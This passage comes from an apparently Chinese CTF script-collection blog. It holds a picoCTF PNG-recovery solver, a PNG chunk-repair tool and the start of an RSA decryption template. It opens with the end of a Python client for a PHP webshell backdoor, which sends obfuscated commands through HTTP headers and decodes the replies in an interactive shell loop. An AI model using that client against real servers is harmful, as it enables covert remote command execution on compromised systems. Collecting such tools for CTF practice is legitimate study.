class="number">0</span>],payloadPieces[iPiece])</span><br><span class="line">        iPiece += <span class="number">1</span></span><br><span class="line">    referer = url + <span class="string">'?'</span> + urllib.urlencode(query)</span><br><span class="line">    debugPrint(<span class="string">'After insert payload, referer is:'</span>)</span><br><span class="line">    debugPrint(query)</span><br><span class="line">    debugPrint(referer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send request</span></span><br><span class="line">    r = sess.get(url,headers=&#123;<span class="string">'Accept-Language'</span>:acceptLangStr,<span class="string">'Referer'</span>:referer&#125;,proxies=proxies)</span><br><span class="line">    html = r.text</span><br><span class="line">    debugPrint(html)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># process response</span></span><br><span class="line">    pattern = re.compile(<span class="string">r'&lt;%s&gt;(.*)&lt;/%s&gt;'</span> % (xorKey,xorKey))</span><br><span class="line">    output = pattern.findall(html)</span><br><span class="line">    <span class="keyword">if</span> len(output) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Error,  no backdoor response'</span></span><br><span class="line">        cmd = raw_input(<span class="string">'phpshell &gt; '</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    output = output[<span class="number">0</span>]</span><br><span class="line">    debugPrint(output)</span><br><span class="line">    output = output.decode(<span class="string">'base64'</span>)</span><br><span class="line">    output = loopXor(output,xorKey)</span><br><span class="line">    output = zlib.decompress(output)</span><br><span class="line">    <span class="keyword">print</span> output</span><br><span class="line">    cmd = raw_input(<span class="string">'phpshell &gt; '</span>)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="js加密bytes转img脚本"><a href="#js加密bytes转img脚本" class="headerlink" title="js加密bytes转img脚本"></a>js加密bytes转img脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b = list(map(int, <span class="string">'230 231 15 119 0 207 252 10 223 255 236 181 64 109 202 199 107 239 234 62 13 133 240 114 73 122 212 133 52 83 96 205 110 80 249 71 0 121 249 65 0 157 103 12 174 4 68 11 98 0 215 114 119 0 183 217 1 69 216 220 73 94 95 13 137 0 95 2 55 10 166 64 84 0 125 116 0 232 106 213 0 16 195 223 40 0 68 181 2 0 255 11 155 66 48 255 164 115 23 233 81 73 231 133 189 120 78 68 145 72 75 195 64 132 157 64 13 18 0 51 16 31 0 13 89 192 170 130 10 203 46 140 98 57 26 102 131 52 0 0 15 77 243 82 201 255 78 175 252 172 1 65 137 194 156 237 239 110 156 108 63 118 1 227 145 191 68 195 102 243 192 71 64 116 101 227 59 68 0 179 129 53 120 213 250 65 180 168 102 154 124 71 235 180 70 173 23 86 64 249 197 70 126 152 252 188 91 150 135 95 51 75 223 249 80 110 243 103 206 59 169 93 55 174 61 241 113 127 85 112 62 237 217 114 146 58 30 99 169 206 243 207 248 194 79 51 82 102 129 73 107 102 17 99 226 191 219 82 17 16 231 249 60 222 226 69 211 239 231 222 121 214 29 206 212 196 125 6 109 73 64 60 114 45 229 231 235 156 73 209 126 85 229 229 21 86 176 201 127 179 127 128 125 143 61 126 125 38 239 252 6 255 12 149 131 1 40 31 98 230 243 174 195 213 57 84 93 35 162 84 155 126 146 244 154 166 108 124 107 250 230 99 176 66 30 151 212 49 121 125 149 7 114 13 9 18 36 252 214 228 86 114 115 229 179 120 108 95 80 127 3 31 37 102 249 203 29 141 74 55 127 107 69 249 100 213 111 249 106 88 174 255 214 9 171 244 185 21 167 116 157 124 248 94 156 153 132 142 235 160 40 1 113 17 180 238 254 117 104 253 90 67 71 2 208 115 207 249 226 246 9 251 248 120 39 57 149 42 187 216 202 105 194 56 198 147 149 211 164 201 218 126 154 250 39 60 225 138 142 73 248 75 210 250 177 182 90 234 249 175 89 24 202 151 15 229 157 196 39 244 207 251 156 1 80 128 78 134 146 173 57 203 202 68 124 241 252 67 65 144 122 181 211 199 26 137 251 174 131 125 46 227 135 238 108 174 202 187 157 227 95 67 139 117 228 118 65 218 255 66 38 168 131 23 143 119 228 80 54 98 255 178 13 17 149 174 109 193 214 156 48 181 242 247 205 198 66 202 246 227 138 134 74 230 207 231 62 99 252 223 115 126 136 144 190 231 18 109 252 16 211 199 248 214 8 183 71 217 126 57 130 190 1 68 239 103 240 85 204 205 252 87 175 74 113 202 222 87 71 36 248 124 163 24 223 63 51 111 207 143 233 53 164 174 178 9 214 223 148 239 11 223 249 188 253 73 38 43 19 231 25 239 90 29 115 231 231 105 217 201 235 113 196 67 30 167 82 113 151 52 178 199 101 157 249 202 117 185 42 180 74 212 162 150 6 54 222 127 76 0 87 142 63 41 159 247 254 225'</span>.split(<span class="string">' '</span>)))</span><br><span class="line">png_header = <span class="string">'89504e470d0a1a0a0000000d49484452'</span></span><br><span class="line">png_header = [png_header[i*<span class="number">2</span>:(i+<span class="number">1</span>)*<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(png_header) // <span class="number">2</span>)]</span><br><span class="line">png_header = list(map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), png_header))</span><br><span class="line"></span><br><span class="line">LEN = <span class="number">16</span></span><br><span class="line">key = [<span class="literal">None</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(LEN)]</span><br><span class="line"></span><br><span class="line">shifters = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(LEN):</span><br><span class="line">    shifters_i = []</span><br><span class="line">    <span class="keyword">for</span> shifter <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">if</span> b[(shifter * LEN) % len(b) + i] == png_header[i]:</span><br><span class="line">            shifters_i.append(shifter)</span><br><span class="line"></span><br><span class="line">    shifters.append(shifters_i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">assemble_png</span><span class="params">(k)</span>:</span></span><br><span class="line">    result = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">30000</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(LEN):</span><br><span class="line">        shifter = ord(k[i]) - ord(<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(b) // LEN):</span><br><span class="line">            result[(j * LEN) + i] = b[(((j + shifter) * LEN) % len(b)) + i]</span><br><span class="line"></span><br><span class="line">    i = len(result) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> result[i] == <span class="number">0</span>:</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    result = result[:i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">valid_keys = []</span><br><span class="line">print(<span class="string">'&#123;:&lt;5&#125;&#123;:&lt;20&#125;&#123;&#125;'</span>.format(<span class="string">'#'</span>, <span class="string">'Candidate'</span>, <span class="string">'isValid?'</span>))</span><br><span class="line"><span class="keyword">for</span> i, key_candidate <span class="keyword">in</span> enumerate(itertools.product(*shifters)):</span><br><span class="line">    key_candidate = <span class="string">''</span>.join(map(str, key_candidate))</span><br><span class="line"></span><br><span class="line">    png_candidate = assemble_png(key_candidate)</span><br><span class="line">    f = io.BytesIO(bytes(png_candidate))</span><br><span class="line"></span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pilimage = Image.open(f)</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">        valid_keys.append(key_candidate)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">'&#123;:&lt;5&#125;&#123;:&lt;20&#125;&#123;&#125;'</span>.format(i, key_candidate, valid))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> valid_keys:</span><br><span class="line">    f = io.BytesIO(bytes(assemble_png(key)))</span><br><span class="line">    pilimage = Image.open(f)</span><br><span class="line">    decoded = decode(pilimage)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'picoCTF'</span> <span class="keyword">in</span> str(decoded.data):</span><br><span class="line">        print(str(decoded.data, <span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="png图片修复"><a href="#png图片修复" class="headerlink" title="png图片修复"></a>png图片修复</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> difflib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(map(<span class="keyword">lambda</span> x: <span class="string">'\\x&#123;:02x&#125;'</span>.format(ord(x)), s))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crc_to_hex</span><span class="params">(c)</span>:</span></span><br><span class="line">    c = hex(c)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(map(<span class="keyword">lambda</span> x: <span class="string">'\\x&#123;&#125;'</span>.format(x), (c[<span class="number">2</span>*i : <span class="number">2</span>*i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(c) / <span class="number">2</span>))))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(map(<span class="keyword">lambda</span> x: <span class="string">'\\x&#123;:02x&#125;'</span>.format(ord(x)), s))    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_chunk_data</span><span class="params">(png, pos)</span>:</span></span><br><span class="line">    c_length = struct.unpack(<span class="string">'&gt;I'</span>, png[pos : pos + <span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">    c_type   = png[pos + <span class="number">4</span> : pos + <span class="number">8</span>]</span><br><span class="line">    c_data   = png[pos + <span class="number">8</span> : pos + <span class="number">8</span> + c_length]</span><br><span class="line">    c_crc    = png[pos + <span class="number">8</span> + c_length : pos + <span class="number">8</span> + c_length + <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">    c_size   = <span class="number">12</span> + c_length</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (c_length, c_type, c_data, c_crc, c_size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_IHDR</span><span class="params">(c_data)</span>:</span></span><br><span class="line">    width     = struct.unpack(<span class="string">'&gt;I'</span>, c_data[:<span class="number">4</span>][<span class="number">0</span>])</span><br><span class="line">    height    = struct.unpack(<span class="string">'&gt;I'</span>, c_data[<span class="number">4</span>:<span class="number">8</span>][<span class="number">0</span>])</span><br><span class="line">    bit_depth = struct.unpack(<span class="string">'&gt;b'</span>, c_data[<span class="number">9</span>:<span class="number">10</span>][<span class="number">0</span>])</span><br><span class="line">    compression_method = struct.unpack(<span class="string">'&gt;b'</span>, c_data[<span class="number">10</span>:<span class="number">11</span>][<span class="number">0</span>])</span><br><span class="line">    filter_method = struct.unpack(<span class="string">'&gt;b'</span>, c_data[<span class="number">11</span>:<span class="number">12</span>][<span class="number">0</span>])</span><br><span class="line">    interlace_method = struct.unpack(<span class="string">'&gt;b'</span>, c_data[<span class="number">12</span>:<span class="number">13</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (width, height, bit_depth, compression_method, filter_method, interlace_method)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    png = open(args.png, <span class="string">'r'</span>).read()</span><br><span class="line"></span><br><span class="line">    suggestions = []</span><br><span class="line">    suggestions_level = []</span><br><span class="line">    error_level = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check file header</span></span><br><span class="line">    png_header = map(chr, [<span class="number">0x89</span>, <span class="number">0x50</span>, <span class="number">0x4e</span>, <span class="number">0x47</span> ,<span class="number">0x0d</span>, <span class="number">0x0a</span> ,<span class="number">0x1a</span> ,<span class="number">0x0a</span>])</span><br><span class="line">    <span class="keyword">if</span> png[:<span class="number">8</span>] != <span class="string">''</span>.join(png_header):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Invalid file header:\n'</span> + \</span><br><span class="line">              <span class="string">'\t'</span> + <span class="string">' '</span>.join(p.encode(<span class="string">'hex'</span>) <span class="keyword">for</span> p <span class="keyword">in</span> png[:<span class="number">8</span>])    + <span class="string">', should be:\n'</span> + \</span><br><span class="line">              <span class="string">'\t'</span> + <span class="string">' '</span>.join(p.encode(<span class="string">'hex'</span>) <span class="keyword">for</span> p <span class="keyword">in</span> png_header)</span><br><span class="line">        error_level = <span class="number">4</span></span><br><span class="line">        suggestions.append(<span class="string">'printf "&#123;&#125;" | dd of=&#123;&#125; bs=1 seek=&#123;&#125; count=&#123;&#125; conv=notrunc'</span>.format(</span><br><span class="line">            str_to_hex(<span class="string">''</span>.join(png_header)), args.png, <span class="number">0</span>, <span class="number">8</span>))</span><br><span class="line">        suggestions_level.append(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Chunks:'</span></span><br><span class="line"></span><br><span class="line">    png_valid_headres = [<span class="string">'PLTE'</span>, <span class="string">'IDAT'</span>, <span class="string">'IEND'</span>, </span><br><span class="line">                         <span class="string">'cHRM'</span>, <span class="string">'gAMA'</span>,<span class="string">'iCCP'</span>, <span class="string">'sBIT'</span>, <span class="string">'sRGB'</span>, <span class="string">'bKGD'</span>, <span class="string">'hIST'</span>, <span class="string">'tRNS'</span>, <span class="string">'pHYs'</span>, <span class="string">'sPLT'</span>, <span class="string">'tIME'</span>, <span class="string">'iTXt'</span>, <span class="string">'tEXt'</span>, <span class="string">'zTXt'</span>]</span><br><span class="line">    parsed_chunks = []</span><br><span class="line">    c_id = <span class="number">0</span></span><br><span class="line">    pos = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'&#123;:&lt;6&#125;&#123;:&lt;15&#125;&#123;:&lt;15&#125;&#123;:&lt;6&#125;&#123;:&lt;15&#125;&#123;:&lt;15&#125;&#123;&#125;'</span>.format(<span class="string">'#'</span>, <span class="string">'Start'</span>, <span class="string">'Length'</span>, <span class="string">'type'</span>, <span class="string">'crc'</span>, <span class="string">'size'</span>, <span class="string">'info'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check chunks</span></span><br><span class="line">    OK = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">while</span> OK:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            c_length, c_type, c_data, c_crc, c_size = get_chunk_data(png, pos)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        c_errors = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> c_id == <span class="number">0</span>: <span class="comment"># First chunk - IHDR</span></span><br><span class="line">            <span class="keyword">if</span> c_type != <span class="string">'IHDR'</span>:</span><br><span class="line">                c_errors.append(<span class="string">'Invalid chunk type (&#123;&#125;), should be "&#123;&#125;"'</span>.format(c_type, <span class="string">'IHDR'</span>))</span><br><span class="line">                error_level = max(error_level, <span class="number">3</span>)</span><br><span class="line">                suggestions.append(<span class="string">'printf "IHDR" | dd of=&#123;&#125; bs=1 seek=&#123;&#125; count=&#123;&#125; conv=notrunc'</span>.format(args.png, pos+<span class="number">4</span>, <span class="number">4</span>))</span><br><span class="line">                suggestions_level.append(<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">if</span> c_length != <span class="number">13</span>:</span><br><span class="line">                c_errors.append(<span class="string">'Invalid chunk length (&#123;&#125;), should be &#123;&#125;'</span>.format(c_length, <span class="number">13</span>))</span><br><span class="line">                error_level = max(error_level, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> c_type <span class="keyword">not</span> <span class="keyword">in</span> png_valid_headres:</span><br><span class="line">                close_matches = difflib.get_close_matches(c_type, png_valid_headres, cutoff=<span class="number">0.3</span>)</span><br><span class="line">                <span class="keyword">if</span> close_matches != []:</span><br><span class="line">                    c_errors.append(<span class="string">'Invalid chunk type (&#123;&#125;), maybe you meant "&#123;&#125;"'</span>.format(c_type, close_matches[<span class="number">0</span>]))</span><br><span class="line">                    error_level = max(error_level, <span class="number">3</span>)</span><br><span class="line">                    suggestions.append(<span class="string">'printf "&#123;&#125;" | dd of=&#123;&#125; bs=1 seek=&#123;&#125; count=&#123;&#125; conv=notrunc'</span>.format(close_matches[<span class="number">0</span>], args.png, pos+<span class="number">4</span>, <span class="number">4</span>))</span><br><span class="line">                    suggestions_level.append(<span class="number">3</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    c_errors.append(<span class="string">'Invalid chunk type (&#123;&#125;)'</span>.format(c_type))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> pos + c_length &gt; len(png) - <span class="number">12</span> <span class="keyword">and</span> c_type != <span class="string">'IEND'</span>:</span><br><span class="line">                c_errors.append(<span class="string">'Invalid chunk length (&#123;&#125;), maximum is: &#123;&#125;'</span>.format(c_length, len(png) - <span class="number">12</span> - pos - <span class="number">12</span>))</span><br><span class="line">                error_level = max(error_level, <span class="number">2</span>)</span><br><span class="line">                suggestions.append(<span class="string">'printf "&#123;&#125;" | dd of=&#123;&#125; bs=1 seek=&#123;&#125; count=&#123;&#125; conv=notrunc'</span>.format(</span><br><span class="line">                    str_to_hex(struct.pack(<span class="string">'&gt;I'</span>, len(png) - <span class="number">12</span> - pos - <span class="number">12</span>)),</span><br><span class="line">                    args.png, pos, <span class="number">4</span>))</span><br><span class="line">                suggestions_level.append(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        calculated_crc = binascii.crc32(c_type + c_data) % (<span class="number">1</span> &lt;&lt; <span class="number">32</span>)</span><br><span class="line">        <span class="keyword">if</span> c_crc != <span class="string">'&#123;:08x&#125;'</span>.format(calculated_crc).decode(<span class="string">'hex'</span>):</span><br><span class="line">            <span class="comment"># print '111\n', c_crc, calculated_crc, '111\n'</span></span><br><span class="line">            c_errors.append(<span class="string">'CRC error (&#123;&#125;), should be: &#123;&#125;'</span>.format(str_to_hex(c_crc), crc_to_hex(calculated_crc)))</span><br><span class="line">            error_level = max(error_level, <span class="number">1</span>)</span><br><span class="line">            suggestions.append(<span class="string">'printf "&#123;&#125;" | dd of=&#123;&#125; bs=1 seek=&#123;&#125; count=&#123;&#125; conv=notrunc'</span>.format(</span><br><span class="line">                crc_to_hex(calculated_crc), args.png, pos + <span class="number">8</span> + c_length, <span class="number">4</span>))</span><br><span class="line">            suggestions_level.append(<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#print c_crc, type(c_crc)</span></span><br><span class="line">            <span class="comment">#print str(binascii.crc32(c_type + c_data) % (1 &lt;&lt; 32)).decode('hex'), type(str(binascii.crc32(c_type + c_data) % (1 &lt;&lt; 32)).decode('hex'))</span></span><br><span class="line">            <span class="comment">#print struct.pack('&lt;i', binascii.crc32(c_type + c_data))</span></span><br><span class="line">            <span class="comment">#print crc_to_hex(binascii.crc32(c_type + c_data) % (1 &lt;&lt; 32)), type(crc_to_hex(binascii.crc32(c_type + c_data) % (1 &lt;&lt; 32)))</span></span><br><span class="line"></span><br><span class="line">        parsed_chunks.append(c_type)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'&#123;:&lt;6&#125;&#123;:&lt;15&#125;&#123;:&lt;15&#125;&#123;:&lt;6&#125;&#123;:&lt;15&#125;&#123;:&lt;15&#125;&#123;&#125;'</span>.format(c_id, pos, c_length, c_type, c_crc.encode(<span class="string">'hex'</span>), c_size, <span class="string">' | '</span>.join(c_errors))</span><br><span class="line"></span><br><span class="line">        c_id += <span class="number">1</span></span><br><span class="line">        pos += min(c_size, len(png) - <span class="number">12</span> - pos)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> c_type == <span class="string">'IEND'</span>:</span><br><span class="line">            OK = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Suggestions:'</span></span><br><span class="line">    <span class="comment"># if error_level == 4:</span></span><br><span class="line">    <span class="comment">#     suggestions = filter(lambda x: 'Invalid file header' in x, suggestions)</span></span><br><span class="line">    <span class="comment"># elif error_level == 3:</span></span><br><span class="line">    <span class="comment">#     suggestions = filter(lambda x: 'Invalid chunk type' in x, suggestions)</span></span><br><span class="line">    <span class="comment"># elif error_level == 2:</span></span><br><span class="line">    <span class="comment">#     suggestions = filter(lambda x: 'Invalid chunk length' in x, suggestions)</span></span><br><span class="line">    <span class="comment"># elif error_level == 1:</span></span><br><span class="line">    <span class="comment">#     suggestions = filter(lambda x: 'CRC error' in x, suggestions)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, (s, sl) <span class="keyword">in</span> enumerate(zip(suggestions, suggestions_level)):</span><br><span class="line">        <span class="keyword">if</span> sl == error_level:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'&#123;&#125;'</span>.format(s)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> error_level &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Please run the tool again after applying the corrections'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'PNG parser.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'png'</span>, type=str, help=<span class="string">'corrupted png file'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-v'</span>, <span class="string">'--verbose'</span>, action=<span class="string">'store_true'</span>, help=<span class="string">'add verbosity'</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">print</span> args</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="RSA解密脚本系列"><a href="#RSA解密脚本系列" class="headerlink" title="RSA解密脚本系列"></a>RSA解密脚本系列</h2><h3 id="rsa解密模板"><a href="#rsa解密模板" class="headerlink" title="rsa解密模板"></a>rsa解密模板</h3><p>以文本形式给出参数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment">#power by jedi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">n = <span 